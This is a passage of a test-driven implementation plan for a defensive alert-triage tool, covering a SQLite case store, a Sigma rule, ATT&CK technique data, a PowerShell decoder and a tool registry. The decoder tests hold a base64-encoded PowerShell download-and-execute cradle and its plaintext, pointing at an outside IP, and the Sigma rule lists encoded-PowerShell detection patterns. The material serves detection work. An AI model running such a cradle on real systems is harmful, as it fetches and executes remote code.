    - `dump_text(self) -> str` (everything stored, for the no-gold test)
    - `close(self) -> None`

- [ ] Step 1: Write failing tests

`tests/store/__init__.py`: empty.

`tests/store/test_case_store.py`:

```python
from datetime import UTC, datetime
from pathlib import Path

import pytest

from alert2attack.domain.events import EventKind
from alert2attack.domain.scenario import Scenario, load_scenario
from alert2attack.store.case_store import CaseNotFound, CaseStore

@pytest.fixture
def store(downloader_scenario: Scenario) -> CaseStore:
    s = CaseStore()
    s.load_case(downloader_scenario.public())
    return s

CASE = "enc_ps_downloader_001"

def test_refuses_gold(downloader_scenario: Scenario) -> None:
    with pytest.raises(ValueError, match="gold"):
        CaseStore().load_case(downloader_scenario)

def test_store_contains_no_gold_text(downloader_scenario: Scenario, tmp_path: Path) -> None:
    db = tmp_path / "case.sqlite"
    s = CaseStore(db)
    s.load_case(downloader_scenario.public())
    assert "GOLD-MARKER" not in s.dump_text()
    assert "GOLD-MARKER" not in db.read_bytes().decode("latin-1")

def test_load_report_and_case_ids(store: CaseStore) -> None:
    assert store.case_ids() == [CASE]

def test_drops_out_of_window_and_other_host(scenario_dir: Path) -> None:
    sc = load_scenario(scenario_dir).public()
    report = CaseStore().load_case(sc)
    assert report.loaded == 2
    assert report.dropped_out_of_window == 1
    assert report.dropped_other_host == 1

def test_alert_and_window(store: CaseStore) -> None:
    alert = store.get_alert(CASE)
    assert alert.trigger_event_id == "ev-0004"
    start, end = store.get_window(CASE)
    assert start == datetime(2024, 3, 12, 9, 55, tzinfo=UTC)
    assert end == datetime(2024, 3, 12, 10, 25, tzinfo=UTC)

def test_unknown_case_raises(store: CaseStore) -> None:
    with pytest.raises(CaseNotFound):
        store.get_alert("nope")

def test_get_event_roundtrips_full_model(store: CaseStore, downloader_scenario: Scenario) -> None:
    original = next(e for e in downloader_scenario.events if e.event_id == "ev-0004")
    assert store.get_event(CASE, "ev-0004") == original
    assert store.get_event(CASE, "ev-9999") is None

def test_find_process_and_children(store: CaseStore) -> None:
    ps = store.find_process(CASE, 5288)
    assert ps is not None and ps.image is not None and ps.image.endswith("powershell.exe")
    assert store.find_process(CASE, 424242) is None
    kids = store.children(CASE, 5288)
    assert [k.pid for k in kids] == [5304]

def test_query_by_kind_pid_and_time(store: CaseStore) -> None:
    net = store.query_events(CASE, kinds=[EventKind.NETWORK_CONNECT])
    assert [e.event_id for e in net] == ["ev-0005", "ev-0010"]
    mine = store.query_events(CASE, pid=5288)
    assert [e.event_id for e in mine] == ["ev-0004", "ev-0005", "ev-0006", "ev-0007"]
    late = store.query_events(CASE, since=datetime(2024, 3, 12, 10, 5, tzinfo=UTC))
    assert [e.event_id for e in late] == ["ev-0011", "ev-0012"]
    early = store.query_events(CASE, until=datetime(2024, 3, 12, 9, 58, tzinfo=UTC))
    assert [e.event_id for e in early] == ["ev-0001", "ev-0002"]

def test_query_contains_is_case_insensitive_and_escapes_like(store: CaseStore) -> None:
    hits = store.query_events(CASE, contains="INVOICE_Q1")
    assert {e.event_id for e in hits} == {"ev-0003", "ev-0004"}
    assert store.query_events(CASE, contains="%") == []
    assert store.query_events(CASE, contains="_") != []  # literal underscore in Invoice_Q1
    assert store.query_events(CASE, contains="185.220.101.4") != []

def test_query_pagination(store: CaseStore) -> None:
    page1 = store.query_events(CASE, limit=5)
    page2 = store.query_events(CASE, limit=5, offset=5)
    page3 = store.query_events(CASE, limit=5, offset=10)
    ids = [e.event_id for e in page1 + page2 + page3]
    assert ids == [f"ev-{i:04d}" for i in range(1, 13)]
```

- [ ] Step 2: Run tests to verify they fail

Run: `uv run pytest tests/store -q`
Expected: `ModuleNotFoundError: No module named 'alert2attack.store'`

- [ ] Step 3: Write `src/alert2attack/store/__init__.py`

```python
from alert2attack.store.case_store import CaseNotFound, CaseStore, LoadReport

__all__ = ["CaseNotFound", "CaseStore", "LoadReport"]
```

- [ ] Step 4: Write `src/alert2attack/store/case_store.py`

```python
"""SQLite-backed case store.

One case = one alert + the boxed telemetry around it (one host, one window).
Gold labels are rejected at the door: ``load_case`` only accepts ``Scenario.public()``.
"""

import json
import sqlite3
from collections.abc import Sequence
from datetime import UTC, datetime
from pathlib import Path

from pydantic import BaseModel

from alert2attack.domain.alert import Alert
from alert2attack.domain.events import Event, EventKind
from alert2attack.domain.scenario import Scenario

_SCHEMA = """
CREATE TABLE IF NOT EXISTS cases (
  case_id      TEXT PRIMARY KEY,
  host         TEXT NOT NULL,
  window_start TEXT NOT NULL,
  window_end   TEXT NOT NULL,
  alert_json   TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS events (
  case_id     TEXT NOT NULL,
  event_id    TEXT NOT NULL,
  kind        TEXT NOT NULL,
  ts          TEXT NOT NULL,
  pid         INTEGER,
  ppid        INTEGER,
  search_text TEXT NOT NULL,
  event_json  TEXT NOT NULL,
  PRIMARY KEY (case_id, event_id)
);
CREATE INDEX IF NOT EXISTS ix_events_pid ON events(case_id, pid);
CREATE INDEX IF NOT EXISTS ix_events_ppid ON events(case_id, ppid);
CREATE INDEX IF NOT EXISTS ix_events_kind_ts ON events(case_id, kind, ts);
"""

def _iso(ts: datetime) -> str:
    return ts.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.%fZ")

def _escape_like(term: str) -> str:
    return term.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")

class CaseNotFound(KeyError):
    pass

class LoadReport(BaseModel):
    case_id: str
    loaded: int
    dropped_out_of_window: int
    dropped_other_host: int

class CaseStore:
    def __init__(self, path: str | Path = ":memory:") -> None:
        self._conn = sqlite3.connect(str(path))
        self._conn.row_factory = sqlite3.Row
        self._conn.executescript(_SCHEMA)

    def close(self) -> None:
        self._conn.close()

    # -- loading -----------------------------------------------------------------

    def load_case(self, scenario: Scenario) -> LoadReport:
        if scenario.gold is not None:
            raise ValueError("refusing to load a scenario that still carries gold; use scenario.public()")
        case_id = scenario.scenario_id
        host = scenario.alert.host
        loaded = out_of_window = other_host = 0
        rows: list[tuple[object, ...]] = []
        for e in scenario.events:
            if e.host != host:
                other_host += 1
                continue
            if not scenario.window.contains(e.ts):
                out_of_window += 1
                continue
            rows.append(
                (
                    case_id,
                    e.event_id,
                    e.kind.value,
                    _iso(e.ts),
                    e.pid,
                    e.ppid,
                    e.search_text(),
                    e.model_dump_json(exclude_none=True),
                )
            )
            loaded += 1
        with self._conn:
            self._conn.execute("DELETE FROM events WHERE case_id = ?", (case_id,))
            self._conn.execute("DELETE FROM cases WHERE case_id = ?", (case_id,))
            self._conn.execute(
                "INSERT INTO cases VALUES (?, ?, ?, ?, ?)",
                (
                    case_id,
                    host,
                    _iso(scenario.window.start),
                    _iso(scenario.window.end),
                    scenario.alert.model_dump_json(),
                ),
            )
            self._conn.executemany("INSERT INTO events VALUES (?, ?, ?, ?, ?, ?, ?, ?)", rows)
        return LoadReport(
            case_id=case_id,
            loaded=loaded,
            dropped_out_of_window=out_of_window,
            dropped_other_host=other_host,
        )

    # -- case metadata -----------------------------------------------------------

    def case_ids(self) -> list[str]:
        cur = self._conn.execute("SELECT case_id FROM cases ORDER BY case_id")
        return [row["case_id"] for row in cur]

    def _case_row(self, case_id: str) -> sqlite3.Row:
        row = self._conn.execute("SELECT * FROM cases WHERE case_id = ?", (case_id,)).fetchone()
        if row is None:
            raise CaseNotFound(case_id)
        return row  # type: ignore[no-any-return]

    def get_alert(self, case_id: str) -> Alert:
        return Alert.model_validate_json(self._case_row(case_id)["alert_json"])

    def get_window(self, case_id: str) -> tuple[datetime, datetime]:
        row = self._case_row(case_id)
        return (
            datetime.fromisoformat(row["window_start"]),
            datetime.fromisoformat(row["window_end"]),
        )

    # -- events ------------------------------------------------------------------

    def get_event(self, case_id: str, event_id: str) -> Event | None:
        row = self._conn.execute(
            "SELECT event_json FROM events WHERE case_id = ? AND event_id = ?", (case_id, event_id)
        ).fetchone()
        return None if row is None else Event.model_validate_json(row["event_json"])

    def find_process(self, case_id: str, pid: int) -> Event | None:
        row = self._conn.execute(
            "SELECT event_json FROM events WHERE case_id = ? AND kind = ? AND pid = ? "
            "ORDER BY ts LIMIT 1",
            (case_id, EventKind.PROCESS_CREATE.value, pid),
        ).fetchone()
        return None if row is None else Event.model_validate_json(row["event_json"])

    def children(self, case_id: str, pid: int) -> list[Event]:
        cur = self._conn.execute(
            "SELECT event_json FROM events WHERE case_id = ? AND kind = ? AND ppid = ? ORDER BY ts",
            (case_id, EventKind.PROCESS_CREATE.value, pid),
        )
        return [Event.model_validate_json(r["event_json"]) for r in cur]

    def query_events(
        self,
        case_id: str,
        *,
        kinds: Sequence[EventKind] | None = None,
        pid: int | None = None,
        since: datetime | None = None,
        until: datetime | None = None,
        contains: str | None = None,
        limit: int = 50,
        offset: int = 0,
    ) -> list[Event]:
        sql = ["SELECT event_json FROM events WHERE case_id = ?"]
        params: list[object] = [case_id]
        if kinds:
            sql.append(f"AND kind IN ({','.join('?' * len(kinds))})")
            params.extend(k.value for k in kinds)
        if pid is not None:
            sql.append("AND pid = ?")
            params.append(pid)
        if since is not None:
            sql.append("AND ts >= ?")
            params.append(_iso(since))
        if until is not None:
            sql.append("AND ts <= ?")
            params.append(_iso(until))
        if contains:
            sql.append("AND search_text LIKE ? ESCAPE '\\'")
            params.append(f"%{_escape_like(contains.lower())}%")
        sql.append("ORDER BY ts, event_id LIMIT ? OFFSET ?")
        params.extend([limit, offset])
        cur = self._conn.execute(" ".join(sql), params)
        return [Event.model_validate_json(r["event_json"]) for r in cur]

    # -- diagnostics -------------------------------------------------------------

    def dump_text(self) -> str:
        parts = [json.dumps(dict(r)) for r in self._conn.execute("SELECT * FROM cases")]
        parts += [json.dumps(dict(r)) for r in self._conn.execute("SELECT * FROM events")]
        return "\n".join(parts)
```

- [ ] Step 5: Run tests

Run: `uv run pytest tests/store -q`
Expected: all pass (11 tests).

- [ ] Step 6: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/store tests/store
git commit -m "feat(store): SQLite CaseStore with boxed loading and scoped queries; gold rejected"
```

### Task 5: Knowledge base: Sigma rule, ATT&CK subset, PowerShell decoder

Files:
- Create: `src/alert2attack/knowledge/__init__.py`, `src/alert2attack/knowledge/base.py`, `src/alert2attack/knowledge/powershell.py`, `src/alert2attack/knowledge/data/sigma/win_powershell_encoded_command.yaml`, `src/alert2attack/knowledge/data/attack_techniques.json`, `src/alert2attack/knowledge/data/ATTRIBUTION.md`
- Test: `tests/knowledge/__init__.py`, `tests/knowledge/test_powershell.py`, `tests/knowledge/test_base.py`

Interfaces:
- Produces:
  - `SigmaRule(BaseModel)`: `slug`, `title`, `description`, `level`, `tags: list[str]`, `falsepositives: list[str]`, `references: list[str]`, `detection: dict[str, Any]`; property `attack_technique_ids -> list[str]`
  - `AttackTechnique(BaseModel)`: `technique_id`, `name`, `tactics: list[str]`, `description`
  - `KnowledgeBase`: `load_default() -> KnowledgeBase`, `rule(slug) -> SigmaRule | None`, `technique(technique_id) -> AttackTechnique | None`, `rule_slugs() -> list[str]`, `technique_ids() -> list[str]`
  - `DecodeResult(BaseModel)`: `encoded: bool`, `decoded: str | None`, `error: str | None`; `decode_powershell(command_line: str) -> DecodeResult`

- [ ] Step 1: Write failing tests

`tests/knowledge/__init__.py`: empty.

`tests/knowledge/test_powershell.py`:

```python
import pytest

from alert2attack.knowledge.powershell import decode_powershell

B64 = (
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBu"
    "AGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAvAGEA"
    "LgBwAHMAMQAnACkA"
)
PLAIN = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.4/a.ps1')"

@pytest.mark.parametrize("flag", ["-enc", "-Enc", "-EncodedCommand", "-e", "-ec", "/enc"])
def test_decodes_common_flag_spellings(flag: str) -> None:
    r = decode_powershell(f"powershell.exe -NoP -W Hidden {flag} {B64}")
    assert r.encoded is True
    assert r.decoded == PLAIN
    assert r.error is None

def test_not_encoded() -> None:
    r = decode_powershell("powershell.exe -NoProfile -File C:\\scripts\\backup.ps1")
    assert r.encoded is False and r.decoded is None and r.error is None

def test_bad_base64_reports_error_not_exception() -> None:
    r = decode_powershell("powershell -enc !!!notbase64!!!")
    assert r.encoded is True and r.decoded is None and r.error is not None

def test_does_not_confuse_execution_policy_flag() -> None:
    r = decode_powershell("powershell.exe -ExecutionPolicy Bypass -File a.ps1")
    assert r.encoded is False
```

`tests/knowledge/test_base.py`:

```python
from alert2attack.knowledge.base import KnowledgeBase

def test_default_knowledge_base_loads_rule_and_techniques() -> None:
    kb = KnowledgeBase.load_default()
    rule = kb.rule("win_powershell_encoded_command")
    assert rule is not None
    assert rule.title == "Suspicious Encoded PowerShell Command Line"
    assert "T1059.001" in rule.attack_technique_ids
    assert rule.falsepositives  # a good rule documents its false positives

    t = kb.technique("T1059.001")
    assert t is not None and t.name == "PowerShell" and "execution" in t.tactics

    assert kb.technique("T9999") is None
    assert kb.rule("nope") is None
    assert "win_powershell_encoded_command" in kb.rule_slugs()
    assert {"T1059.001", "T1547.001", "T1105", "T1003.001"} <= set(kb.technique_ids())
```

- [ ] Step 2: Run tests to verify they fail

Run: `uv run pytest tests/knowledge -q`
Expected: `ModuleNotFoundError: No module named 'alert2attack.knowledge'`

- [ ] Step 3: Write the data files

`src/alert2attack/knowledge/data/ATTRIBUTION.md`:

```markdown
# Third-party data

- `sigma/*.yaml`: detection rules adapted from the SigmaHQ project
  (https://github.com/SigmaHQ/sigma), licensed under the Detection Rule License 1.1.
  Each file records its upstream reference. Phase 2 replaces adapted rules with verbatim copies.
- `attack_techniques.json`: technique names, ids and tactics from MITRE ATT&CK®
  (https://attack.mitre.org), used under the ATT&CK Terms of Use. Descriptions here are
  short paraphrases written for this project, not MITRE text.
```

`src/alert2attack/knowledge/data/sigma/win_powershell_encoded_command.yaml`:

```yaml
title: Suspicious Encoded PowerShell Command Line
slug: win_powershell_encoded_command
status: stable
description: >
  Detects PowerShell started with an encoded command (-EncodedCommand / -enc / -e) combined
  with options commonly used to hide execution (-NoProfile, -NonInteractive, -WindowStyle Hidden).
  Encoded commands are a common way to smuggle download-and-execute stagers through
  document macros and scheduled tasks, but are also used by legitimate management agents.
references:
  - https://github.com/SigmaHQ/sigma
  - https://attack.mitre.org/techniques/T1059/001/
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
  - attack.t1027
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_enc:
    CommandLine|contains:
      - ' -e '
      - ' -ec '
      - ' -enc '
      - ' -EncodedCommand '
  selection_hidden:
    CommandLine|contains:
      - ' -nop'
      - ' -noni'
      - ' -w hidden'
      - ' -windowstyle hidden'
  condition: selection_img and selection_enc and selection_hidden
falsepositives:
  - Endpoint management agents (SCCM/ConfigMgr, Intune, RMM tools) running inventory or
    remediation scripts as SYSTEM with an encoded command
  - Software installers and build agents that wrap scripts to avoid quoting issues
level: high
```

`src/alert2attack/knowledge/data/attack_techniques.json`:

```json
[
  {"technique_id": "T1059", "name": "Command and Scripting Interpreter", "tactics": ["execution"], "description": "Abuse of command-line and scripting interpreters to execute commands, scripts or binaries."},
  {"technique_id": "T1059.001", "name": "PowerShell", "tactics": ["execution"], "description": "Use of PowerShell to run commands, download payloads or execute scripts, often obfuscated or encoded."},
  {"technique_id": "T1059.003", "name": "Windows Command Shell", "tactics": ["execution"], "description": "Use of cmd.exe to run commands or batch scripts."},
  {"technique_id": "T1566.001", "name": "Phishing: Spearphishing Attachment", "tactics": ["initial-access"], "description": "A malicious file delivered as an email attachment that the user is lured into opening."},
  {"technique_id": "T1204.002", "name": "User Execution: Malicious File", "tactics": ["execution"], "description": "The user opens a delivered file (document, archive, executable) which starts the malicious chain."},
  {"technique_id": "T1105", "name": "Ingress Tool Transfer", "tactics": ["command-and-control"], "description": "Downloading tools or payloads from an external system into the compromised environment."},
  {"technique_id": "T1547.001", "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "tactics": ["persistence", "privilege-escalation"], "description": "Adding a program to a Run/RunOnce key or Startup folder so it executes at logon."},
  {"technique_id": "T1053.005", "name": "Scheduled Task/Job: Scheduled Task", "tactics": ["execution", "persistence", "privilege-escalation"], "description": "Creating or modifying a Windows scheduled task to run code on a schedule or at logon."},
  {"technique_id": "T1543.003", "name": "Create or Modify System Process: Windows Service", "tactics": ["persistence", "privilege-escalation"], "description": "Installing or modifying a Windows service so a payload runs with SYSTEM privileges and survives reboot."},
  {"technique_id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "tactics": ["credential-access"], "description": "Reading the memory of lsass.exe to extract credential material."},
  {"technique_id": "T1027", "name": "Obfuscated Files or Information", "tactics": ["defense-evasion"], "description": "Encoding, encrypting or otherwise obscuring payloads and commands to evade analysis and detection."},
  {"technique_id": "T1218.005", "name": "System Binary Proxy Execution: Mshta", "tactics": ["defense-evasion"], "description": "Using mshta.exe to execute HTA files or inline script through a trusted signed binary."},
  {"technique_id": "T1218.010", "name": "System Binary Proxy Execution: Regsvr32", "tactics": ["defense-evasion"], "description": "Using regsvr32.exe to load and run code, including remote scriptlets, via a trusted signed binary."},
  {"technique_id": "T1218.011", "name": "System Binary Proxy Execution: Rundll32", "tactics": ["defense-evasion"], "description": "Using rundll32.exe to execute DLL exports or scripts through a trusted signed binary."},
  {"technique_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares", "tactics": ["lateral-movement"], "description": "Using SMB admin shares (ADMIN$, C$) with valid credentials to move laterally and execute remotely, e.g. PsExec."},
  {"technique_id": "T1047", "name": "Windows Management Instrumentation", "tactics": ["execution"], "description": "Using WMI to execute commands locally or on remote hosts."},
  {"technique_id": "T1071.001", "name": "Application Layer Protocol: Web Protocols", "tactics": ["command-and-control"], "description": "Command-and-control traffic blended into HTTP/HTTPS."},
  {"technique_id": "T1070.004", "name": "Indicator Removal: File Deletion", "tactics": ["defense-evasion"], "description": "Deleting dropped files or tools to remove traces of activity."}
]
```

- [ ] Step 4: Write `src/alert2attack/knowledge/__init__.py`

```python
from alert2attack.knowledge.base import AttackTechnique, KnowledgeBase, SigmaRule
from alert2attack.knowledge.powershell import DecodeResult, decode_powershell

__all__ = ["AttackTechnique", "DecodeResult", "KnowledgeBase", "SigmaRule", "decode_powershell"]
```

- [ ] Step 5: Write `src/alert2attack/knowledge/powershell.py`

```python
"""Deterministic PowerShell -EncodedCommand decoder. No LLM involved."""

import base64
import binascii
import re

from pydantic import BaseModel

# PowerShell accepts any unambiguous prefix of -EncodedCommand; ``-e`` and ``-ec`` are the
# short forms attackers actually use. ``-ExecutionPolicy`` starts with ``-e`` too, hence the
# explicit alternation instead of a bare prefix match.
_ENC_FLAG_RE = re.compile(
    r"(?:^|\s)[-/](?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|"
    r"encodedcomm|encodedcomma|encodedcomman|encodedcommand)\s+([A-Za-z0-9+/=]+|\S+)",
    re.IGNORECASE,
)

class DecodeResult(BaseModel):
    encoded: bool
    decoded: str | None = None
    error: str | None = None

def decode_powershell(command_line: str) -> DecodeResult:
    m = _ENC_FLAG_RE.search(command_line)
    if m is None:
        return DecodeResult(encoded=False)
    payload = m.group(1)
    try:
        raw = base64.b64decode(payload, validate=True)
        return DecodeResult(encoded=True, decoded=raw.decode("utf-16-le"))
    except (binascii.Error, ValueError, UnicodeDecodeError) as exc:
        return DecodeResult(encoded=True, error=f"could not decode payload: {exc}")
```

- [ ] Step 6: Write `src/alert2attack/knowledge/base.py`

```python
import json
from pathlib import Path
from typing import Any

import yaml
from pydantic import BaseModel, ConfigDict, Field

DATA_DIR = Path(__file__).resolve().parent / "data"

class SigmaRule(BaseModel):
    model_config = ConfigDict(frozen=True, extra="ignore")

    slug: str
    title: str
    description: str
    level: str
    tags: list[str] = Field(default_factory=list)
    falsepositives: list[str] = Field(default_factory=list)
    references: list[str] = Field(default_factory=list)
    detection: dict[str, Any] = Field(default_factory=dict)

    @property
    def attack_technique_ids(self) -> list[str]:
        ids: list[str] = []
        for tag in self.tags:
            if tag.lower().startswith("attack.t"):
                ids.append(tag.split(".", 1)[1].upper())
        return ids

class AttackTechnique(BaseModel):
    model_config = ConfigDict(frozen=True, extra="forbid")

    technique_id: str = Field(pattern=r"^T\d{4}(\.\d{3})?$")
    name: str
    tactics: list[str]
    description: str

class KnowledgeBase:
    def __init__(self, rules: dict[str, SigmaRule], techniques: dict[str, AttackTechnique]) -> None:
        self._rules = rules
        self._techniques = techniques

    @classmethod
    def load_default(cls) -> "KnowledgeBase":
        return cls.load(DATA_DIR)

    @classmethod
    def load(cls, data_dir: Path) -> "KnowledgeBase":
        rules: dict[str, SigmaRule] = {}
        for path in sorted((data_dir / "sigma").glob("*.yaml")):
            raw = yaml.safe_load(path.read_text(encoding="utf-8"))
            raw.setdefault("slug", path.stem)
            rule = SigmaRule.model_validate(raw)
            rules[rule.slug] = rule
        raw_techniques = json.loads((data_dir / "attack_techniques.json").read_text(encoding="utf-8"))
        techniques = {t["technique_id"]: AttackTechnique.model_validate(t) for t in raw_techniques}
        return cls(rules, techniques)

    def rule(self, slug: str) -> SigmaRule | None:
        return self._rules.get(slug)

    def technique(self, technique_id: str) -> AttackTechnique | None:
        return self._techniques.get(technique_id.upper())

    def rule_slugs(self) -> list[str]:
        return sorted(self._rules)

    def technique_ids(self) -> list[str]:
        return sorted(self._techniques)
```

- [ ] Step 7: Run tests

Run: `uv run pytest tests/knowledge -q`
Expected: all pass (10 tests).

- [ ] Step 8: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/knowledge tests/knowledge
git commit -m "feat(knowledge): vendored Sigma rule, ATT&CK subset, PowerShell decoder"
```

### Task 6: Tool context, evidence ledger, registry

Files:
- Create: `src/alert2attack/tools/context.py`, `src/alert2attack/tools/registry.py`
- Test: `tests/tools/__init__.py`, `tests/tools/test_registry.py`

Interfaces:
- Consumes: `CaseStore`, `KnowledgeBase`.
- Produces:
  - `ToolResult(BaseModel)`: `ok: bool = True`, `data: Any = None`, `evidence_ids: list[str] = []`, `truncated: bool = False`, `error: str | None = None`; classmethod `fail(message: str) -> ToolResult`
  - `ToolCallRecord(BaseModel)`: `seq: int`, `tool: str`, `args: dict[str, Any]`, `ok: bool`, `evidence_ids: list[str]`, `error: str | None`, `duration_ms: float`
  - `EvidenceLedger`: `record(record: ToolCallRecord) -> None`, `has(evidence_id: str) -> bool`, `ids() -> frozenset[str]`, `calls: list[ToolCallRecord]`, `first_seen(evidence_id) -> int | None`
  - `ToolContext` (frozen dataclass): `store: CaseStore`, `case_id: str`, `ledger: EvidenceLedger`, `knowledge: KnowledgeBase`
  - `ToolFn = Callable[[ToolContext, Any], ToolResult]`
  - `ToolSpec` (dataclass): `name`, `description`, `args_model: type[BaseModel]`, `fn: ToolFn`
  - `ToolRegistry`: `register(name, description, args_model) -> Callable[[ToolFn], ToolFn]` (decorator), `names() -> list[str]`, `spec(name) -> ToolSpec`, `openai_schemas() -> list[dict[str, Any]]`, `call(ctx, name, raw_args: Mapping[str, Any]) -> ToolResult`

- [ ] Step 1: Write failing tests

`tests/tools/__init__.py`: empty.

`tests/tools/test_registry.py`:

```python
from typing import Any

import pytest
from pydantic import BaseModel, ConfigDict, Field

from alert2attack.domain.scenario import Scenario
from alert2attack.knowledge.base import KnowledgeBase
from alert2attack.store.case_store import CaseStore
from alert2attack.tools.context import EvidenceLedger, ToolContext, ToolResult
from alert2attack.tools.registry import ToolRegistry

class EchoArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    n: int = Field(ge=0, description="how many ids to return")

@pytest.fixture
def ctx(downloader_scenario: Scenario) -> ToolContext:
    store = CaseStore()
    store.load_case(downloader_scenario.public())
    return ToolContext(
        store=store,
        case_id=downloader_scenario.scenario_id,
        ledger=EvidenceLedger(),
        knowledge=KnowledgeBase.load_default(),
    )

@pytest.fixture
def registry() -> ToolRegistry:
    reg = ToolRegistry()

    @reg.register("echo", "Return n fake evidence ids.", EchoArgs)
    def echo(ctx: ToolContext, args: Any) -> ToolResult:
        ids = [f"ev-{i:04d}" for i in range(1, args.n + 1)]
        return ToolResult(data={"n": args.n}, evidence_ids=ids)

    @reg.register("boom", "Always raises.", EchoArgs)
    def boom(ctx: ToolContext, args: Any) -> ToolResult:
        raise RuntimeError("kaboom")

    return reg

def test_openai_schema_shape(registry: ToolRegistry) -> None:
    schemas = registry.openai_schemas()
    echo = next(s for s in schemas if s["function"]["name"] == "echo")
    assert echo["type"] == "function"
    assert echo["function"]["description"] == "Return n fake evidence ids."
    params = echo["function"]["parameters"]
    assert params["properties"]["n"]["description"] == "how many ids to return"
    assert params["additionalProperties"] is False
    assert registry.names() == ["boom", "echo"]

def test_call_records_evidence_in_ledger(registry: ToolRegistry, ctx: ToolContext) -> None:
    result = registry.call(ctx, "echo", {"n": 2})
    assert result.ok and result.evidence_ids == ["ev-0001", "ev-0002"]
    assert ctx.ledger.ids() == frozenset({"ev-0001", "ev-0002"})
    assert ctx.ledger.has("ev-0001") and not ctx.ledger.has("ev-0003")
    assert len(ctx.ledger.calls) == 1
    rec = ctx.ledger.calls[0]
    assert rec.seq == 1 and rec.tool == "echo" and rec.args == {"n": 2} and rec.ok
    assert rec.duration_ms >= 0
    assert ctx.ledger.first_seen("ev-0002") == 1

def test_unknown_tool_is_an_error_result_not_an_exception(registry: ToolRegistry, ctx: ToolContext) -> None:
    result = registry.call(ctx, "nope", {})
    assert not result.ok and result.error is not None
    assert "unknown tool 'nope'" in result.error and "echo" in result.error
    assert ctx.ledger.calls[-1].ok is False

def test_invalid_args_is_an_error_result(registry: ToolRegistry, ctx: ToolContext) -> None:
    result = registry.call(ctx, "echo", {"n": -1})
    assert not result.ok and result.error is not None and "n" in result.error
    result = registry.call(ctx, "echo", {"n": 1, "extra": True})
    assert not result.ok and result.error is not None and "extra" in result.error
    assert ctx.ledger.ids() == frozenset()

def test_tool_exception_is_captured(registry: ToolRegistry, ctx: ToolContext) -> None:
    result = registry.call(ctx, "boom", {"n": 0})
    assert not result.ok and result.error is not None and "kaboom" in result.error

def test_duplicate_registration_rejected(registry: ToolRegistry) -> None:
    with pytest.raises(ValueError, match="already registered"):

        @registry.register("echo", "dup", EchoArgs)
        def echo2(ctx: ToolContext, args: Any) -> ToolResult:
            return ToolResult()
```

- [ ] Step 2: Run tests to verify they fail

Run: `uv run pytest tests/tools/test_registry.py -q`
Expected: `ModuleNotFoundError: No module named 'alert2attack.tools'`

- [ ] Step 3: Write `src/alert2attack/tools/context.py`

```python
"""Shared tool plumbing: results, call records, the evidence ledger, the context handle."""

from dataclasses import dataclass, field
from typing import Any

from pydantic import BaseModel, Field

from alert2attack.knowledge.base import KnowledgeBase
from alert2attack.store.case_store import CaseStore

class ToolResult(BaseModel):
    ok: bool = True
    data: Any = None
    evidence_ids: list[str] = Field(default_factory=list)
    truncated: bool = False
    error: str | None = None

    @classmethod
    def fail(cls, message: str) -> "ToolResult":
        return cls(ok=False, error=message)

class ToolCallRecord(BaseModel):
    seq: int
    tool: str
    args: dict[str, Any]
    ok: bool
    evidence_ids: list[str]
    error: str | None
    duration_ms: float

@dataclass
class EvidenceLedger:
    """Every evidence id the agent has actually been shown in this run, and how it got it."""

    calls: list[ToolCallRecord] = field(default_factory=list)
    _first_seen: dict[str, int] = field(default_factory=dict)

    def record(self, record: ToolCallRecord) -> None:
        self.calls.append(record)
        for eid in record.evidence_ids:
            self._first_seen.setdefault(eid, record.seq)

    def has(self, evidence_id: str) -> bool:
        return evidence_id in self._first_seen

    def ids(self) -> frozenset[str]:
        return frozenset(self._first_seen)

    def first_seen(self, evidence_id: str) -> int | None:
        return self._first_seen.get(evidence_id)

@dataclass(frozen=True)
class ToolContext:
    store: CaseStore
    case_id: str
    ledger: EvidenceLedger
    knowledge: KnowledgeBase
```

- [ ] Step 4: Write `src/alert2attack/tools/registry.py`

```python
"""Tool registry: name → (args schema, function). The only entry point the agent gets."""

from collections.abc import Callable, Mapping
from dataclasses import dataclass
from time import perf_counter
from typing import Any

from pydantic import BaseModel, ValidationError

from alert2attack.tools.context import ToolCallRecord, ToolContext, ToolResult

ToolFn = Callable[[ToolContext, Any], ToolResult]

@dataclass(frozen=True)
class ToolSpec:
    name: str
    description: str
    args_model: type[BaseModel]
    fn: ToolFn

class ToolRegistry:
    def __init__(self) -> None:
        self._tools: dict[str, ToolSpec] = {}

    def register(
        self, name: str, description: str, args_model: type[BaseModel]
    ) -> Callable[[ToolFn], ToolFn]:
        def decorator(fn: ToolFn) -> ToolFn:
            if name in self._tools:
                raise ValueError(f"tool '{name}' already registered")
            self._tools[name] = ToolSpec(name, description, args_model, fn)
            return fn

        return decorator

    def names(self) -> list[str]:
        return sorted(self._tools)

    def spec(self, name: str) -> ToolSpec:
        return self._tools[name]

    def openai_schemas(self) -> list[dict[str, Any]]:
        schemas: list[dict[str, Any]] = []
        for name in self.names():
            spec = self._tools[name]
            params = spec.args_model.model_json_schema()
            params.pop("title", None)
            params.setdefault("additionalProperties", False)
            schemas.append(
                {
                    "type": "function",
                    "function": {"name": name, "description": spec.description, "parameters": params},
                }
            )
        return schemas

    def call(self, ctx: ToolContext, name: str, raw_args: Mapping[str, Any]) -> ToolResult:
        started = perf_counter()
        spec = self._tools.get(name)
        if spec is None:
            result = ToolResult.fail(f"unknown tool '{name}'; available tools: {', '.join(self.names())}")
        else:
            try:
                args = spec.args_model.model_validate(dict(raw_args))
            except ValidationError as exc:
